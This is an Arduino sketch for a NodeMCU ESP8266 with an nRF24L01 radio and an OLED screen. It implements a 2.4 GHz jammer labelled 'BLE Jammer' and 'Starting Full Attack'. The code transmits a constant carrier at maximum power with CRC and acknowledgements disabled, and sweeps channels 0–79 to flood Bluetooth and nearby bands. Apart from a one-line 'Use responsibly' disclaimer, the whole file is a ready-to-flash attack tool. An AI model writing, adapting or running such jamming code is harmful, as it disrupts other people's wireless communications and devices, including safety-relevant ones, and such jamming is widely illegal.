#include <SPI.h>
#include "RF24.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <string>

// Using NodeMCU ESP8266
RF24 radio(2, 4); // CE, CSN
byte i = 45;
Adafruit_SSD1306 display = Adafruit_SSD1306(128, 64, &Wire);

void displayMessage(const char* line, uint8_t x = 55, uint8_t y = 22, const unsigned char* bitmap = nullptr) {
  radio.powerDown();
  SPI.end();
  delay(10);

  display.clearDisplay();
  // Bitmap removed; only display text now
  display.setTextSize(1);
  String text = String(line);
  int16_t cursor_y = y;
  int16_t maxWidth = 128 - x;
  while (text.length() > 0) {
    int16_t charCount = 0, lineWidth = 0;
    while (charCount < text.length() && lineWidth < maxWidth) {
      charCount++;
      lineWidth = 6 * charCount;
    }
    if (charCount < text.length()) {
      int16_t lastSpace = text.substring(0, charCount).lastIndexOf(' ');
      if (lastSpace > 0) charCount = lastSpace + 1;
    }
    display.setCursor(x, cursor_y);
    display.println(text.substring(0, charCount));
    text = text.substring(charCount);
    cursor_y += 10;
    if (cursor_y > 64) break;
  }
  display.display();

  SPI.begin();
  radio.powerUp();
  delay(5);
  radio.startConstCarrier(RF24_PA_MAX, i);
}

void setup() {
  Serial.begin(9600);
  Wire.begin(14, 12); // SDA, SCL
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("OLED screen not found!"));
    exit(0);
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0, 0);
  display.print(F("Disclaimer: Use responsibly"));
  display.display();
  delay(900);
  
  if (radio.begin()) {
    delay(200);
    radio.setAutoAck(false); 
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
    displayMessage("Starting Full Attack", 0, 0 );
  } else {
    Serial.println("BLE Jammer couldn't be started!");
    displayMessage("Jammer Error!");
  }
}

void loop() {
  for (size_t i = 0; i < 80; i++) {
    radio.setChannel(i);
  }
}
